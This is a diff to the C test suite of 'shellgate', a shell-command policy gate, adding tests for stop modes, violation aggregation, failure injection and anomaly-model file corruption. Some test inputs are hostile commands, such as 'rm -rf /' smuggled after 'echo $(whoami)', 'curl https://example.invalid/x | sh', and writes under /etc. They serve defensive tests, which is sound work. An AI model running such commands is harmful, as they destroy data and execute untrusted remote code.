@@ -1,10 +1,15 @@
+#include "sg_anomaly.h"
 #include "shell_abstract.h"
 #include "shell_tokenizer.h"
 #include "shellgate.h"
+#include "test_allocator.h"
+#include "test_io.h"
+#include "test_sg_failures.h"
 #include <math.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/stat.h>
 #include <unistd.h>
 
 static int pass_count = 0;
@@ -109,8 +114,14 @@ static void register_temp_file(const char *path) {
 
 static const char *temp_policy_file(void) {
   static char path[256];
-  snprintf(path, sizeof(path), "/tmp/shellgate_test_%d_%d.txt", getpid(),
-           temp_file_count);
+  snprintf(path, sizeof(path), "/tmp/shellgate-test-XXXXXX");
+  int fd = mkstemp(path);
+  if (fd < 0)
+    return NULL;
+  if (close(fd) != 0) {
+    unlink(path);
+    return NULL;
+  }
   register_temp_file(path);
   return path;
 }
@@ -541,6 +552,7 @@ TEST(stop_mode_matrix) {
     ASSERT(eval_cmd(g, cases[i].input, &result) == SG_OK);
     ASSERT(result.verdict == cases[i].verdict);
     ASSERT(result.subcmd_count == cases[i].command_count);
+    ASSERT(result.short_circuited == (i < 6));
     for (size_t j = 0; j < cases[i].command_count; j++) {
       ASSERT(result.subcmds[j].command != NULL);
       ASSERT_STR(result.subcmds[j].command, cases[i].commands[j]);
@@ -548,6 +560,24 @@ TEST(stop_mode_matrix) {
     }
     sg_gate_free(g);
   }
+}
+
+TEST(stop_mode_substitution_prefix) {
+  static const char *rules[] = {"echo *", "whoami"};
+  sg_gate_t *gate = gate_with_rules(rules, 2);
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_STOP_FIRST_ALLOW));
+
+  sg_result_t result;
+  ASSERT_SG_OK(eval_cmd(gate, "echo $(whoami) ; rm -rf /", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+  ASSERT(result.short_circuited);
+  ASSERT(result.subcmd_count == 1);
+  ASSERT_STR(result.subcmds[0].command, "echo $(whoami)");
+  ASSERT(!result.requires_substitution_evaluation);
+  ASSERT(!result.truncated);
+  sg_gate_free(gate);
 }
 
 TEST(pipeline_many_subcommands) {
@@ -561,6 +591,15 @@ TEST(pipeline_many_subcommands) {
   for (uint32_t i = 0; i < r.subcmd_count; i++) {
     ASSERT(r.subcmds[i].matches);
   }
+
+  char command[512] = {0};
+  for (size_t i = 0; i < SG_MAX_SUBCMD_RESULTS + 1; i++)
+    strcat(command, i == 0 ? "ls" : " ; ls");
+  ASSERT(eval_cmd(g, command, &r) == SG_ERR_TRUNC);
+  ASSERT(r.truncated);
+  ASSERT(r.subcmd_truncated);
+  ASSERT(r.subcmd_count == SG_MAX_SUBCMD_RESULTS);
+  ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
   sg_gate_free(g);
 }
 
@@ -650,6 +689,95 @@ TEST(policy_mutation_matrix) {
   sg_gate_free(g);
 }
 
+TEST(policy_wrapper_error_translation) {
+  const char *path = temp_policy_file();
+  ASSERT(path != NULL);
+
+  sg_gate_t *source = sg_gate_new();
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(source != NULL && gate != NULL);
+  ASSERT_SG_OK(sg_gate_add_rule(source, "cat #path"));
+  ASSERT_SG_OK(sg_gate_save_policy(source, path));
+  ASSERT_SG_OK(sg_gate_add_rule(gate, "ls"));
+
+  st_test_alloc_fail_at(1);
+  sg_error_t error = sg_gate_add_rule(gate, "pwd");
+  st_test_alloc_reset();
+  ASSERT(error == SG_ERR_MEMORY);
+  ASSERT(sg_gate_rule_count(gate) == 1);
+  sg_result_t result;
+  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+  ASSERT_SG_OK(eval_cmd(gate, "pwd", &result));
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+
+  st_test_alloc_fail_at(1);
+  error = sg_gate_load_policy(gate, path);
+  st_test_alloc_reset();
+  ASSERT(error == SG_ERR_MEMORY);
+  ASSERT(sg_gate_rule_count(gate) == 1);
+
+  st_test_io_fail_at(1);
+  error = sg_gate_save_policy(gate, path);
+  st_test_io_reset();
+  ASSERT(error == SG_ERR_IO);
+
+  ASSERT_SG_OK(sg_gate_load_policy(gate, path));
+  ASSERT(sg_gate_rule_count(gate) == 2);
+  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+  ASSERT_SG_OK(eval_cmd(gate, "cat /etc/hosts", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+
+  char missing[] = "/tmp/shellgate-missing-XXXXXX";
+  int fd = mkstemp(missing);
+  ASSERT(fd >= 0);
+  ASSERT(close(fd) == 0);
+  ASSERT(unlink(missing) == 0);
+  ASSERT(sg_gate_load_policy(gate, missing) == SG_ERR_IO);
+  ASSERT(sg_gate_add_rule(gate, "") == SG_ERR_INVALID);
+
+  FILE *malformed = fopen(path, "wb");
+  ASSERT(malformed != NULL);
+  ASSERT(fputs("not a policy\n", malformed) >= 0);
+  ASSERT(fclose(malformed) == 0);
+  ASSERT(sg_gate_load_policy(gate, path) == SG_ERR_PARSE);
+  ASSERT(sg_gate_rule_count(gate) == 2);
+
+  sg_gate_free(gate);
+  sg_gate_free(source);
+}
+
+TEST(policy_evaluation_allocation_failure) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_add_rule(gate, "echo *"));
+  ASSERT_SG_OK(sg_gate_add_deny_rule(gate, "rm *"));
+  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, 0.1, -10.0));
+
+  sg_result_t result;
+  st_test_alloc_reset();
+  ASSERT_SG_OK(eval_cmd(gate, "unknown argument", &result));
+  size_t allocation_count = st_test_alloc_count();
+  ASSERT(allocation_count > 0);
+  size_t memory_failures = 0;
+  for (size_t i = 1; i <= allocation_count; i++) {
+    size_t vocab_before = sg_gate_anomaly_vocab_size(gate);
+    st_test_alloc_fail_at(i);
+    sg_error_t error = eval_cmd(gate, "another unknown", &result);
+    st_test_alloc_reset();
+    if (error == SG_ERR_MEMORY) {
+      memory_failures++;
+      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+      ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), vocab_before);
+    } else {
+      ASSERT(error == SG_OK);
+    }
+  }
+  ASSERT(memory_failures > 0);
+  sg_gate_free(gate);
+}
+
 /* --- SERIALIZATION --- */
 
 TEST(save_load_roundtrip) {
@@ -687,8 +815,8 @@ TEST(save_load_roundtrip) {
 }
 
 TEST(save_load_empty) {
-  const char *path = "/tmp/shellgate_test_empty.txt";
-  register_temp_file(path);
+  const char *path = temp_policy_file();
+  ASSERT(path != NULL);
   sg_gate_t *g = sg_gate_new();
   ASSERT(sg_gate_rule_count(g) == 0);
 
@@ -710,8 +838,8 @@ TEST(save_load_empty) {
 }
 
 TEST(save_load_malformed) {
-  const char *path = "/tmp/shellgate_test_malformed.txt";
-  register_temp_file(path);
+  const char *path = temp_policy_file();
+  ASSERT(path != NULL);
   FILE *f = fopen(path, "w");
   ASSERT(f != NULL);
   fprintf(f, "NOT A VALID SHELLGATE POLICY FILE\n");
@@ -812,6 +940,7 @@ TEST(helper_contracts) {
                   {SG_VERDICT_DENY, "DENY"},
                   {SG_VERDICT_REJECT, "REJECT"},
                   {SG_VERDICT_UNDETERMINED, "UNDETERMINED"},
+                  {SG_VERDICT_ALLOW_CONDITIONAL, "ALLOW_CONDITIONAL"},
                   {(sg_verdict_t)-1, "UNKNOWN"}};
   for (size_t i = 0; i < sizeof(verdicts) / sizeof(verdicts[0]); i++)
     ASSERT_STR(sg_verdict_name(verdicts[i].verdict), verdicts[i].name);
@@ -844,33 +973,21 @@ TEST(helper_contracts) {
 }
 
 TEST(suggestion_token_variant_contract) {
-  static const struct {
-    const char *pattern;
-    size_t position;
-    st_token_type_t classified;
-  } cases[] = {
-      {"timeout 42 ls", 1, ST_TYPE_NUMBER},
-      {"cat /tmp/file", 1, ST_TYPE_ABS_PATH},
-      {"git #w", 1, ST_TYPE_WORD},
-  };
   sg_gate_t *gate = sg_gate_new();
   ASSERT(gate != NULL);
 
-  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
-    st_token_variant_t variants[ST_MAX_TOKEN_VARIANTS] = {0};
-    size_t count = sg_gate_suggestion_token_variants_at(
-        gate, cases[i].pattern, cases[i].position, variants,
-        ST_MAX_TOKEN_VARIANTS);
-    ASSERT(count >= 2 && count <= ST_MAX_TOKEN_VARIANTS);
-    ASSERT(variants[0].type == ST_TYPE_LITERAL);
-    ASSERT(variants[1].type == cases[i].classified);
-    ASSERT(variants[count - 1].type == ST_TYPE_ANY);
-    for (size_t j = 0; j < count; j++) {
-      ASSERT(variants[j].type_symbol == st_type_symbol[variants[j].type]);
-      ASSERT(variants[j].sample_value == NULL);
-      for (size_t k = 0; k < j; k++)
-        ASSERT(variants[k].type != variants[j].type);
-    }
+  st_token_variant_t variants[ST_MAX_TOKEN_VARIANTS] = {0};
+  size_t count = sg_gate_suggestion_token_variants_at(
+      gate, "timeout 42 ls", 1, variants, ST_MAX_TOKEN_VARIANTS);
+  ASSERT(count >= 2 && count <= ST_MAX_TOKEN_VARIANTS);
+  ASSERT(variants[0].type == ST_TYPE_LITERAL);
+  ASSERT(variants[1].type == ST_TYPE_NUMBER);
+  ASSERT(variants[count - 1].type == ST_TYPE_ANY);
+  for (size_t i = 0; i < count; i++) {
+    ASSERT(variants[i].type_symbol == st_type_symbol[variants[i].type]);
+    ASSERT(variants[i].sample_value == NULL);
+    for (size_t j = 0; j < i; j++)
+      ASSERT(variants[j].type != variants[i].type);
   }
 
   struct {
@@ -882,7 +999,7 @@ TEST(suggestion_token_variant_contract) {
   ASSERT(bounded.only.type == ST_TYPE_LITERAL);
   ASSERT(bounded.canary == UINT64_C(0x9a47b31d20ef658c));
 
-  st_token_variant_t variants[ST_MAX_TOKEN_VARIANTS];
+  memset(variants, 0, sizeof(variants));
   ASSERT(sg_gate_suggestion_token_variants_at(gate, NULL, 0, variants,
                                               ST_MAX_TOKEN_VARIANTS) == 0);
   ASSERT(sg_gate_suggestion_token_variants_at(gate, "", 0, variants,
@@ -1328,6 +1445,37 @@ TEST(violation_capacity_contract) {
   ASSERT(sg_result_violation_dropped(&result) == 4);
   ASSERT(result.violation_truncated);
   ASSERT(result.violation_flags == SG_VIOL_WRITE_SENSITIVE);
+  sg_gate_free(gate);
+}
+
+TEST(violation_dropped_types_remain_aggregated) {
+  char command[2048] = {0};
+  size_t used = 0;
+  for (size_t i = 0; i < SG_MAX_VIOLATIONS; i++) {
+    int written = snprintf(command + used, sizeof(command) - used,
+                           "%secho x > /etc/mixed-%zu", i ? " ; " : "", i);
+    ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
+    used += (size_t)written;
+  }
+  int written = snprintf(command + used, sizeof(command) - used,
+                         " ; curl https://example.invalid/x | sh");
+  ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
+
+  sg_gate_t *gate = gate_with_violations();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  sg_result_t result;
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(result.violation_count == SG_MAX_VIOLATIONS);
+  ASSERT(result.violation_dropped_count > 0);
+  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
+  ASSERT(result.violation_type_flags & SG_VIOL_NET_DOWNLOAD_EXEC);
+  ASSERT(result.violation_category_flags & SG_VIOL_CAT_FILESYSTEM);
+  ASSERT(result.violation_category_flags & SG_VIOL_CAT_NETWORK);
+  bool stored_network = false;
+  for (uint32_t i = 0; i < result.violation_count; i++)
+    stored_network |= result.violations[i].type == SG_VIOL_NET_DOWNLOAD_EXEC;
+  ASSERT(!stored_network);
   sg_gate_free(gate);
 }
 
@@ -1783,7 +1931,7 @@ TEST(anomaly_model_roundtrip) {
   snprintf(type_path, sizeof(type_path), "%s_type", path);
   register_temp_file(type_path);
   ASSERT(sg_gate_save_anomaly_model(g, path) == SG_OK);
-  ASSERT(access(type_path, F_OK) == 0);
+  ASSERT(access(type_path, F_OK) != 0);
 
   sg_gate_t *g2 = sg_gate_new();
   ASSERT(g2 != NULL);
@@ -1803,22 +1951,6 @@ TEST(anomaly_model_roundtrip) {
   ASSERT(actual.anomaly_score_type == expected.anomaly_score_type);
   ASSERT(actual.anomaly_score == expected.anomaly_score);
 
-  /* A missing type sidecar is accepted for compatibility with raw-only model
-   * files, but only the raw score can then round-trip. */
-  ASSERT(unlink(type_path) == 0);
-  sg_gate_t *raw_only = sg_gate_new();
-  ASSERT(raw_only != NULL);
-  ASSERT(sg_gate_enable_anomaly(raw_only, 100.0, 0.1, -10.0) == SG_OK);
-  ASSERT(sg_gate_load_anomaly_model(raw_only, path) == SG_OK);
-  ASSERT(sg_gate_set_anomaly_update_mode(raw_only, true) == SG_OK);
-  ASSERT(eval_cmd(raw_only, probe, &actual) == SG_OK);
-  ASSERT(actual.anomaly_score_raw == expected.anomaly_score_raw);
-  ASSERT(actual.anomaly_score_type != expected.anomaly_score_type);
-
-  FILE *bad = fopen(type_path, "wb");
-  ASSERT(bad != NULL);
-  ASSERT(fputs("not an anomaly model\n", bad) >= 0);
-  ASSERT(fclose(bad) == 0);
   sg_gate_t *invalid = sg_gate_new();
   ASSERT(invalid != NULL);
   ASSERT(sg_gate_save_anomaly_model(invalid, path) == SG_ERR_INVALID);
@@ -1826,7 +1958,15 @@ TEST(anomaly_model_roundtrip) {
   ASSERT(sg_gate_enable_anomaly(invalid, 100.0, 0.1, -10.0) == SG_OK);
   ASSERT(eval_cmd(invalid, "one ; two ; three ; four", &actual) == SG_OK);
   ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(invalid), 4);
-  ASSERT(sg_gate_load_anomaly_model(invalid, path) == SG_ERR_IO);
+
+  /* Gate persistence intentionally rejects standalone v3 model files. */
+  sg_anomaly_model_t *legacy = sg_anomaly_model_new();
+  ASSERT(legacy != NULL);
+  const char *legacy_seq[] = {"one", "two", "three"};
+  sg_anomaly_update(legacy, legacy_seq, 3);
+  ASSERT(sg_anomaly_save(legacy, path) == 0);
+  sg_anomaly_model_free(legacy);
+  ASSERT(sg_gate_load_anomaly_model(invalid, path) == SG_ERR_PARSE);
   ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(invalid), 4);
 
   char missing_path[256];
@@ -1835,10 +1975,222 @@ TEST(anomaly_model_roundtrip) {
   unlink(missing_path);
   ASSERT(sg_gate_load_anomaly_model(invalid, missing_path) == SG_ERR_IO);
   sg_gate_free(invalid);
-  sg_gate_free(raw_only);
   sg_gate_free(g2);
   sg_gate_free(g);
-  unlink(type_path);
+}
+
+TEST(anomaly_bundle_corruption_matrix) {
+  static const char *training = "cat /etc/hosts ; grep root ; sort";
+  const char *path = temp_policy_file();
+  ASSERT(path != NULL);
+  sg_gate_t *source = sg_gate_new();
+  sg_gate_t *target = sg_gate_new();
+  ASSERT(source != NULL && target != NULL);
+  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, 0.1, -10.0));
+  ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, 0.1, -10.0));
+  sg_result_t result;
+  for (int i = 0; i < 8; i++)
+    ASSERT_SG_OK(eval_cmd(source, training, &result));
+  ASSERT_SG_OK(eval_cmd(target, "one ; two ; three ; four", &result));
+  size_t preserved_vocab = sg_gate_anomaly_vocab_size(target);
+  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));
+
+  FILE *file = fopen(path, "rb");
+  ASSERT(file != NULL);
+  ASSERT(fseek(file, 0, SEEK_END) == 0);
+  long length = ftell(file);
+  ASSERT(length > 32 && fseek(file, 0, SEEK_SET) == 0);
+  unsigned char *valid = malloc((size_t)length + 1);
+  unsigned char *data = malloc((size_t)length + 1);
+  ASSERT(valid != NULL && data != NULL);
+  ASSERT(fread(valid, 1, (size_t)length, file) == (size_t)length);
+  ASSERT(fclose(file) == 0);
+
+  enum corruption { BAD_MAGIC, BAD_LENGTH, BAD_CHECKSUM, TRUNCATED, TRAILING };
+  static const enum corruption cases[] = {BAD_MAGIC, BAD_LENGTH, BAD_CHECKSUM,
+                                          TRUNCATED, TRAILING};
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    memcpy(data, valid, (size_t)length);
+    size_t write_length = (size_t)length;
+    switch (cases[i]) {
+    case BAD_MAGIC:
+      data[0] ^= 0xff;
+      break;
+    case BAD_LENGTH:
+      memset(data + 8, 0xff, 8);
+      break;
+    case BAD_CHECKSUM:
+      data[24] ^= 1;
+      break;
+    case TRUNCATED:
+      write_length--;
+      break;
+    case TRAILING:
+      data[write_length++] = 'x';
+      break;
+    }
+    file = fopen(path, "wb");
+    ASSERT(file != NULL);
+    ASSERT(fwrite(data, 1, write_length, file) == write_length);
+    ASSERT(fclose(file) == 0);
+    ASSERT(sg_gate_load_anomaly_model(target, path) == SG_ERR_PARSE);
+    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(target), preserved_vocab);
+  }
+
+  file = fopen(path, "wb");
+  ASSERT(file != NULL);
+  ASSERT(fwrite(valid, 1, (size_t)length, file) == (size_t)length);
+  ASSERT(fclose(file) == 0);
+  ASSERT_SG_OK(sg_gate_load_anomaly_model(target, path));
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(target),
+                 sg_gate_anomaly_vocab_size(source));
+  free(data);
+  free(valid);
+  sg_gate_free(target);
+  sg_gate_free(source);
+}
+
+TEST(anomaly_bundle_failure_atomicity) {
+  const char *path = temp_policy_file();
+  ASSERT(path != NULL);
+  sg_gate_t *first = sg_gate_new();
+  sg_gate_t *second = sg_gate_new();
+  ASSERT(first != NULL && second != NULL);
+  ASSERT_SG_OK(sg_gate_enable_anomaly(first, 100.0, 0.1, -10.0));
+  ASSERT_SG_OK(sg_gate_enable_anomaly(second, 100.0, 0.1, -10.0));
+  sg_result_t result;
+  ASSERT_SG_OK(eval_cmd(first, "one ; two ; three", &result));
+  ASSERT_SG_OK(eval_cmd(second, "one ; two ; three ; four", &result));
+  size_t first_vocab = sg_gate_anomaly_vocab_size(first);
+  size_t second_vocab = sg_gate_anomaly_vocab_size(second);
+  ASSERT(first_vocab != second_vocab);
+
+  sg_test_io_reset();
+  ASSERT_SG_OK(sg_gate_save_anomaly_model(first, path));
+  size_t io_operations = sg_test_io_count();
+  sg_test_io_reset();
+  ASSERT(io_operations > 0);
+
+  for (size_t i = 1; i <= io_operations; i++) {
+    ASSERT_SG_OK(sg_gate_save_anomaly_model(first, path));
+    sg_test_io_fail_at(i);
+    ASSERT(sg_gate_save_anomaly_model(second, path) == SG_ERR_IO);
+    sg_test_io_reset();
+
+    sg_gate_t *loaded = sg_gate_new();
+    ASSERT(loaded != NULL);
+    ASSERT_SG_OK(sg_gate_enable_anomaly(loaded, 100.0, 0.1, -10.0));
+    ASSERT_SG_OK(sg_gate_load_anomaly_model(loaded, path));
+    size_t loaded_vocab = sg_gate_anomaly_vocab_size(loaded);
+    /* A post-rename directory-sync failure may report I/O after the complete
+     * replacement became visible. Either generation is valid; a partial one
+     * is never visible. */
+    ASSERT(loaded_vocab == first_vocab || loaded_vocab == second_vocab);
+    sg_gate_free(loaded);
+  }
+
+  ASSERT(chmod(path, 0640) == 0);
+  ASSERT_SG_OK(sg_gate_save_anomaly_model(second, path));
+  struct stat status;
+  ASSERT(stat(path, &status) == 0);
+  ASSERT((status.st_mode & 0777) == 0640);
+
+  sg_test_alloc_fail_at(1);
+  ASSERT(sg_gate_save_anomaly_model(first, path) == SG_ERR_MEMORY);
+  sg_test_alloc_reset();
+  sg_gate_t *preserved = sg_gate_new();
+  ASSERT(preserved != NULL);
+  ASSERT_SG_OK(sg_gate_enable_anomaly(preserved, 100.0, 0.1, -10.0));
+  ASSERT_SG_OK(sg_gate_load_anomaly_model(preserved, path));
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(preserved), second_vocab);
+  sg_gate_free(preserved);
+  sg_gate_free(second);
+  sg_gate_free(first);
+}
+
+TEST(anomaly_bundle_load_allocation_failure) {
+  const char *path = temp_policy_file();
+  ASSERT(path != NULL);
+  sg_gate_t *source = sg_gate_new();
+  ASSERT(source != NULL);
+  ASSERT_SG_OK(sg_gate_enable_anomaly(source, 100.0, 0.1, -10.0));
+  sg_result_t result;
+  ASSERT_SG_OK(eval_cmd(source, "cat a ; grep b ; sort", &result));
+  ASSERT_SG_OK(sg_gate_save_anomaly_model(source, path));
+
+  sg_gate_t *probe = sg_gate_new();
+  ASSERT(probe != NULL);
+  ASSERT_SG_OK(sg_gate_enable_anomaly(probe, 100.0, 0.1, -10.0));
+  sg_test_alloc_reset();
+  ASSERT_SG_OK(sg_gate_load_anomaly_model(probe, path));
+  size_t allocation_count = sg_test_alloc_count();
+  sg_test_alloc_reset();
+  sg_gate_free(probe);
+  ASSERT(allocation_count > 0);
+
+  for (size_t i = 1; i <= allocation_count; i++) {
+    sg_gate_t *target = sg_gate_new();
+    ASSERT(target != NULL);
+    ASSERT_SG_OK(sg_gate_enable_anomaly(target, 100.0, 0.1, -10.0));
+    ASSERT_SG_OK(eval_cmd(target, "one ; two ; three ; four", &result));
+    size_t preserved_vocab = sg_gate_anomaly_vocab_size(target);
+    sg_test_alloc_fail_at(i);
+    ASSERT(sg_gate_load_anomaly_model(target, path) == SG_ERR_MEMORY);
+    sg_test_alloc_reset();
+    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(target), preserved_vocab);
+    sg_gate_free(target);
+  }
+  sg_gate_free(source);
+}
+
+TEST(anomaly_allocation_failure_matrix) {
+  sg_result_t result;
+  sg_gate_t *probe = sg_gate_new();
+  ASSERT(probe != NULL);
+  sg_test_alloc_reset();
+  ASSERT_SG_OK(sg_gate_enable_anomaly(probe, 100.0, 0.1, -10.0));
+  size_t enable_allocations = sg_test_alloc_count();
+  sg_test_alloc_reset();
+  sg_gate_free(probe);
+  ASSERT(enable_allocations >= 2);
+
+  for (size_t i = 1; i <= enable_allocations; i++) {
+    sg_gate_t *gate = sg_gate_new();
+    ASSERT(gate != NULL);
+    sg_test_alloc_fail_at(i);
+    sg_error_t error = sg_gate_enable_anomaly(gate, 100.0, 0.1, -10.0);
+    sg_test_alloc_reset();
+    ASSERT(error == SG_ERR_MEMORY);
+    ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), 0);
+    sg_gate_free(gate);
+  }
+
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, 0.1, -10.0));
+  ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gate, 4));
+  ASSERT_SG_OK(eval_cmd(gate, "ls ; cd /tmp ; pwd", &result));
+  sg_test_alloc_fail_at(1);
+  ASSERT(sg_gate_set_anomaly_cache_size(gate, 8) == SG_ERR_MEMORY);
+  sg_test_alloc_reset();
+  ASSERT_SG_OK(eval_cmd(gate, "ls ; cd /tmp ; pwd", &result));
+
+  sg_anomaly_model_t *raw_probe = sg_anomaly_model_new();
+  ASSERT(raw_probe != NULL);
+  const char *raw_sequence[] = {"gcc", "make", "test"};
+  sg_test_anomaly_op_reset();
+  sg_anomaly_update(raw_probe, raw_sequence, 3);
+  size_t raw_operation_count = sg_test_anomaly_op_count();
+  sg_test_anomaly_op_reset();
+  sg_anomaly_model_free(raw_probe);
+  ASSERT(raw_operation_count > 0);
+  /* Raw model consumes exactly raw_operation_count operations; fail the first
+   * following operation, which belongs to the type model. */
+  sg_test_anomaly_op_fail_at(raw_operation_count + 1);
+  ASSERT_SG_OK(eval_cmd(gate, "gcc ; make ; test", &result));
+  sg_test_anomaly_op_reset();
+  ASSERT(sg_gate_anomaly_had_error(gate));
+  sg_gate_free(gate);
 }
 
 TEST(anomaly_stress_test) {
@@ -2317,11 +2669,14 @@ int main(void) {
 
   printf("\nConfiguration:\n");
   RUN(stop_mode_matrix);
+  RUN(stop_mode_substitution_prefix);
   RUN(pipeline_many_subcommands);
   RUN(reject_mask_feature_matrix);
 
   printf("\nPolicy management:\n");
   RUN(policy_mutation_matrix);
+  RUN(policy_wrapper_error_translation);
+  RUN(policy_evaluation_allocation_failure);
 
   printf("\nSerialization:\n");
   RUN(save_load_roundtrip);
@@ -2339,6 +2694,7 @@ int main(void) {
   RUN(violation_rule_matrix);
   RUN(violation_configuration_matrix);
   RUN(violation_capacity_contract);
+  RUN(violation_dropped_types_remain_aggregated);
   RUN(violation_absence_matrix);
 
   printf("\nHelpers:\n");
@@ -2356,6 +2712,10 @@ int main(void) {
   RUN(anomaly_learning_policy_matrix);
   RUN(anomaly_short_sequence_scoring);
   RUN(anomaly_model_roundtrip);
+  RUN(anomaly_bundle_corruption_matrix);
+  RUN(anomaly_bundle_failure_atomicity);
+  RUN(anomaly_bundle_load_allocation_failure);
+  RUN(anomaly_allocation_failure_matrix);
   RUN(anomaly_stress_test);
   RUN(anomaly_calibration_matrix);
   RUN(anomaly_weight_matrix);
